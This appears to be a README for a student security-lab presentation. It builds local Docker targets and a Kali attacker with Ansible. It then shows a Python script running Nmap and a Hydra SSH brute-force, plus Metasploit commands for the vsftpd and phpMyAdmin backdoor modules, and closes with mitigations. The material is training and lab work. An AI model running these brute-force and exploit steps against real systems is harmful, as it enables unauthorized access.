# BootCon Project Setup (Category 02 & 03)

## 📌 Presentation Topics
1. **Developing a Python Script for Automated SSH Brute-Force Simulation Using Hydra and Nmap**  
2. **Demonstrating a Metasploit-Based Penetration Test Against a Dockerized Linux Target**

---

## 🧠 Project Goals
- **Python Automation:** Demonstrate an automation script using Python that performs Nmap scanning and brute-force SSH with Hydra.
- **Metasploit Demo:** Show how to use `msfconsole` from Kali to exploit a known vulnerability in a Linux container.

---

## 🛠️ Technologies and Tools Used
- Python 3 (automation scripting)
- Docker (container runtime)
- Kali Linux Docker image (attacker)
- Ubuntu Docker image with OpenSSH server (target)
- Metasploitable2 Docker container (vulnerable target)
- Hydra (brute-force tool)
- Nmap (network scanner)
- Metasploit Framework
- Ansible (automation)

---

## 💻 Lab Setup on macOS Using Docker (Colima Already Running)

### ✅ Step 1: Verify Docker Context with Colima
```bash
colima list
```
```bash
docker context use colima
```

---

### ✅ Step 2: Launch the Ubuntu SSH Target (Automated)
**File: `setup-target.yml`**
```yaml
- name: Set up Ubuntu SSH Target
  hosts: localhost
  connection: local
  tasks:
    - name: Start Ubuntu SSH target container
      community.docker.docker_container:
        name: target_ssh
        image: ubuntu
        state: started
        recreate: yes
        command: /bin/bash
        tty: yes
        interactive: yes
        published_ports:
          - "2222:22"

    - name: Install and configure SSH in container
      community.docker.docker_container_exec:
        container: target_ssh
        command: |
          bash -c "apt update && apt install openssh-server -y && service ssh start && echo 'root:toor' | chpasswd"
```
Run with:
```bash
ansible-playbook setup-target.yml
```

---

### ✅ Step 3: Launch Kali Attacker Container (Automated)
**File: `setup-kali.yml`**
```yaml
- name: Set up Kali Attacker Container
  hosts: localhost
  connection: local
  tasks:
    - name: Start Kali container
      community.docker.docker_container:
        name: kali_attacker
        image: kalilinux/kali-rolling
        state: started
        recreate: yes
        command: /bin/bash
        tty: yes
        interactive: yes

    - name: Install tools in Kali
      community.docker.docker_container_exec:
        container: kali_attacker
        command: |
          bash -c "apt update && apt install -y hydra nmap python3 metasploit-framework wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz"
```
Run with:
```bash
ansible-playbook setup-kali.yml
```

---

### ✅ Step 4: Launch Metasploitable2 Target (Automated)
**File: `setup-metasploit.yml`**
```yaml
- name: Set up Metasploitable2 Container
  hosts: localhost
  connection: local
  tasks:
    - name: Start Metasploitable2 container
      community.docker.docker_container:
        name: metasploit_target
        image: tleemcjr/metasploitable2
        state: started
        recreate: yes
        command: /bin/bash
        tty: yes
        interactive: yes
        published_ports:
          - "8180:80"
          - "2223:22"
```
Run with:
```bash
ansible-playbook setup-metasploit.yml
```

---

### ✅ Step 5: Python Automation Script (inside Kali)
**File: ssh_bruteforce.py**
```python
import os

target_ip = "host.docker.internal"
target_port = 2222
username = "root"
wordlist = "/usr/share/wordlists/rockyou.txt"

print("[*] Scanning with Nmap...")
os.system(f"nmap -p {target_port} {target_ip}")

print("[*] Launching Hydra brute-force attack...")
os.system(f"hydra -l {username} -P {wordlist} -s {target_port} ssh://{target_ip}")
```
Run it:
```bash
docker exec -it kali_attacker python3 ssh_bruteforce.py
```

---

### ✅ Step 6: Metasploit Exploit (inside Kali)
```bash
docker exec -it kali_attacker msfconsole
```
Try exploits:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST host.docker.internal
set RPORT 21
run
```
Or:
```bash
use exploit/unix/webapp/phpmyadmin_3522_backdoor
set RHOST host.docker.internal
set RPORT 8180
run
```

---

## 🧪 Demonstration
- Show Nmap scan and Hydra login crack.
- Use Metasploit to gain access to vulnerable service.

---

## 🔒 Mitigation Techniques
- Use firewalls to block unnecessary ports.
- Patch known vulnerable services.
- Use strong credentials.
- Disable root SSH login.

---

## 💻 Google Slides Checklist
- [ ] Title slide
- [ ] Background: Hydra, SSH, Metasploit
- [ ] Why this project: Brute-force + vulnerability demo
- [ ] Technical concepts: Python, Nmap, Kali, Docker
- [ ] Lab setup: Docker
- [ ] Live or recorded demo
- [ ] Summary and mitigation

---

## 🧹 Cleanup Script
**File: `lab-cleanup.yml`**
```yaml
- name: Clean up Docker Containers
  hosts: localhost
  connection: local
  tasks:
    - name: Remove Kali container
      community.docker.docker_container:
        name: kali_attacker
        state: absent
        force_kill: true

    - name: Remove Ubuntu SSH target
      community.docker.docker_container:
        name: target_ssh
        state: absent
        force_kill: true

    - name: Remove Metasploitable2 container
      community.docker.docker_container:
        name: metasploit_target
        state: absent
        force_kill: true
```
Run it:
```bash
ansible-playbook lab-cleanup.yml
```

---

## ✅ Summary
- Demonstrates automated brute-force and vulnerability exploitation
- Combines Python scripting, Docker, Metasploit
- Fully portable, quick-to-setup lab
- All Ansible-based automation for setup and teardown
